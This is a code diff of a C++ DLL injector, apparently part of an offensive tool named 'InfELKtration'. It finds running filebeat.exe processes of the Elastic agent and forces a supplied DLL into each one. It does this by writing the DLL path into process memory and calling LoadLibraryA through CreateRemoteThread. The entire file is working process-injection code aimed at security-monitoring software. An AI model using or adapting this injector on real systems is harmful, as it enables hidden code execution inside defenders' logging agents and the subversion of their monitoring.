@@ -10,11 +10,21 @@
 #include "LibConstants.h"
 
 #define DLL_FILEPATH_MAX_LENGTH 120
+#define MAX_PIDS 5
+    
+// code references:
+// https://docs.microsoft.com/en-us/windows/win32/psapi/enumerating-all-processes
+// https://docs.microsoft.com/en-us/windows/win32/toolhelp/taking-a-snapshot-and-viewing-processes
 
-BOOL inject_dll(const char *);
+BOOL inject_dll(DWORD, const char *);
+DWORD get_filebeat_pids();
+
+DWORD targetPids[MAX_PIDS+1] = { 0 };
 
 int main(int argc, char **argv)
 {
+    DWORD ret, i;
+
     if (argc != 4) {
         Logger::Error("Not enough arguments!");
         Logger::Error("Usage: %s [path to InfELKtrationInjectLib.dll] [full URL to ElasticSearch server] [ElasticSearch API key]", argv[0]);
@@ -23,38 +33,38 @@ int main(int argc, char **argv)
         return 1;
     }
 
+    if (!(ret = get_filebeat_pids())) {
+        Logger::Error("Failed to find filebeat.exe processes");
+        return 1;
+    }
 
+    Logger::Info("Found %d filebeat.exe processes", ret);
 
     Logger::Info("Injecting DLL at %s", argv[1]);
 
-    if (inject_dll(argv[1])) {
-        Logger::Info("Successfully injected DLL");
+    for (i = 0; targetPids[i]; i++) {
+        if (inject_dll(targetPids[i], argv[1])) {
+            Logger::Info("Successfully injected DLL in pid %d", targetPids[i]);
+        }
+        else {
+            Logger::Error("Failed to inject DLL in pid %d", targetPids[i]);
+        }
     }
-    else {
-        Logger::Error("Failed to inject DLL");
-    }
+
+    return 0;
 }
 
-BOOL inject_dll(const char *dllFilename) {
-    // code references:
-    // https://docs.microsoft.com/en-us/windows/win32/psapi/enumerating-all-processes
-    // https://docs.microsoft.com/en-us/windows/win32/toolhelp/taking-a-snapshot-and-viewing-processes
-
-    HANDLE hSnapshot, hProcess;
+DWORD get_filebeat_pids() {
+    HANDLE hSnapshot;
     PROCESSENTRY32 processEntry;
-    DWORD targetPid = 0;
-    DWORD targetPids[5] = { 0 };
     DWORD targetPidCount = 0;
-    LPVOID szDllFilepath;
-    HMODULE hKernel32;
-    LPTHREAD_START_ROUTINE loadLibrary;
 
     // get snapshot of running processes on the system
     hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (hSnapshot == INVALID_HANDLE_VALUE) {
         Logger::Error("CreateToolhelp32Snapshot failed");
         Logger::LastError();
-        return false;
+        return 0;
     }
 
     // PROCESSENTRY32 docs state that the size needs to be initialized b/f calling Process32First
@@ -64,11 +74,15 @@ BOOL inject_dll(const char *dllFilename) {
     if (!Process32First(hSnapshot, &processEntry)) {
         Logger::Error("Process32First failed");
         Logger::LastError();
-        return false;
+        return 0;
     }
 
     // loop through processes
     do {
+        if (targetPidCount == MAX_PIDS) {
+            Logger::Error("Found too many filebeat.exe processes");
+            return 0;
+        }
         if (CompareStringOrdinal(L"filebeat.exe", -1, processEntry.szExeFile, -1, false) == CSTR_EQUAL) {
             Logger::Info("Found filebeat.exe (pid=%d)", processEntry.th32ProcessID);
             targetPids[targetPidCount++] = processEntry.th32ProcessID;
@@ -77,67 +91,68 @@ BOOL inject_dll(const char *dllFilename) {
 
     CloseHandle(hSnapshot);
 
-    if (!targetPids[0]) {
-        Logger::Error("Failed to find a filebeat.exe process");
+    return targetPidCount;
+}
+
+BOOL inject_dll(DWORD pid, const char *dllFilename) {
+    HANDLE hProcess;
+    LPVOID szDllFilepath;
+    HMODULE hKernel32;
+    LPTHREAD_START_ROUTINE loadLibrary;
+    
+    Logger::Info("Injecting into pid %d", pid);
+    
+    // open handle to target process
+    hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
+    if (!hProcess) {
+        Logger::Error("OpenProcess failed");
+        Logger::LastError();
+        return false;
+    }
+    
+    Logger::Info("Opened handle to target process: 0x%p", hProcess);
+    
+    // allocate memory for the dll filepath
+    szDllFilepath = VirtualAllocEx(hProcess, NULL, DLL_FILEPATH_MAX_LENGTH, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!szDllFilepath) {
+        Logger::Error("VirtualAllocEx failed");
+        Logger::LastError();
+        return false;
+    }
+    
+    Logger::Info("Allocated mem for DLL filepath: 0x%p", szDllFilepath);
+    
+    // write dll path into target process
+    if (!WriteProcessMemory(hProcess, szDllFilepath, dllFilename, DLL_FILEPATH_MAX_LENGTH, NULL)) {
+        Logger::Error("WriteProcessMemory failed");
+        Logger::LastError();
+        return false;
+    }
+    
+    Logger::Info("Copied DLL path into target process");
+
+    // get the base addr for kernel32.dll
+    hKernel32 = GetModuleHandleA("Kernel32");
+    if (!hKernel32) {
+        Logger::Error("GetModuleHandleA failed");
+        Logger::LastError();
         return false;
     }
 
-    // elastic-agent.exe spawns two filebeat.exe processes
-    // we could probably just inject into the one with the lowest pid, but do both/all just in case
-    for (DWORD i = 0; i < targetPidCount; i++) {
-        targetPid = targetPids[i];
-
-        Logger::Info("Injecting into pid %d", targetPid);
-    
-        // open handle to target process
-        hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, targetPid);
-        if (!hProcess) {
-            Logger::Error("OpenProcess failed");
-            Logger::LastError();
-            return false;
-        }
-    
-        Logger::Info("Opened handle to target process: 0x%p", hProcess);
-    
-        // allocate memory for the dll filepath
-        szDllFilepath = VirtualAllocEx(hProcess, NULL, DLL_FILEPATH_MAX_LENGTH, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-        if (!szDllFilepath) {
-            Logger::Error("VirtualAllocEx failed");
-            Logger::LastError();
-            return false;
-        }
-    
-        Logger::Info("Allocated mem for DLL filepath: 0x%p", szDllFilepath);
-    
-        // write dll path into target process
-        if (!WriteProcessMemory(hProcess, szDllFilepath, dllFilename, DLL_FILEPATH_MAX_LENGTH, NULL)) {
-            Logger::Error("WriteProcessMemory failed");
-            Logger::LastError();
-            return false;
-        }
-    
-        Logger::Info("Copied DLL path into target process");
-
-        hKernel32 = GetModuleHandleA("Kernel32");
-        if (!hKernel32) {
-            Logger::Error("GetModuleHandleA failed");
-            Logger::LastError();
-            return false;
-        }
-
-        loadLibrary = (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryA");
-        if (!loadLibrary) {
-            Logger::Error("GetProcAddress failed");
-            Logger::LastError();
-            return false;
-        }
-
-        CreateRemoteThread(hProcess, NULL, NULL, loadLibrary, szDllFilepath, NULL, NULL);
-    
-        Logger::Info("Executed DLL in target process");
-    
-        CloseHandle(hProcess);
+    // get the address of LoadLibraryA
+    loadLibrary = (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryA");
+    if (!loadLibrary) {
+        Logger::Error("GetProcAddress failed");
+        Logger::LastError();
+        return false;
     }
+
+    // load the DLL in the target process, this executes dllmain for DLL_PROCESS_ATTACH
+    CreateRemoteThread(hProcess, NULL, NULL, loadLibrary, szDllFilepath, NULL, NULL);
+    
+    Logger::Info("Executed DLL in target process");
+    
+    CloseHandle(hProcess);
 
     return true;
 }
